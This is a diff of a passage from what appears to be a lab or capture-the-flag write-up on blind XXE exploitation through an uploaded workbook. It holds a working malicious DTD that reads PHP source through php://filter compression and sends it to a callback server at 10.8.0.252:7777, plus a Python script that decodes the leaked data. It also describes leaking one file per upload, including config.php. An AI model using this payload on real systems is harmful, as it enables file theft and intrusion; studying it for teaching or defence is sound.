@@ -109,14 +109,15 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ...
 ```
 
-At this point the application is leaking local files through a blind XXE callback. Small files are easy to exfiltrate but larger PHP source files hit URL length limits because the file contents travel through the HTTP query string. The workaround is to compress before base64 encoding
+At this point the application is leaking local files through a blind XXE callback. Small files like /etc/passwd fit easily in the URL but larger PHP source files hit URL length limits because the file contents travel through the HTTP query string. The workaround is to compress before base64 encoding. The DTD below is the template i used
 ```xml
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/inc/pages/upload.php">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.8.0.252:7777/?data=%file;'>">
 %eval;
 %exfil;
 ```
-Then decode and decompress locally. The command i used was
+
+So what does this actually do? The php://filter wrapper reads the file and runs it through two filters. zlib.deflate compresses it first to shrink it and convert.base64-encode makes it safe to travel in the URL. The result is sent to our callback server in the query string which is why it has to stay small. To read a leaked file back i decoded and decompressed it locally. The command i used was
 ```python
 import base64
 import zlib
@@ -127,7 +128,7 @@ source = zlib.decompress(raw, -15).decode("utf-8")
 print(source)
 ```
 
-This exposed the important application files
+The important thing to note is that one DTD leaks one file. The resource= path is the only thing that changes between runs. My first target was upload.php itself since that's the sink we are attacking and it confirmed the vulnerable code we saw earlier. After that i just edited the resource= path, regenerated the workbook and re-uploaded it for every file i wanted. One upload per file, one callback per file and the decode script above turns each callback into readable PHP source. This is what the full exfiltration gave me
 ```
 /var/www/html/index.php
 /var/www/html/inc/config.php
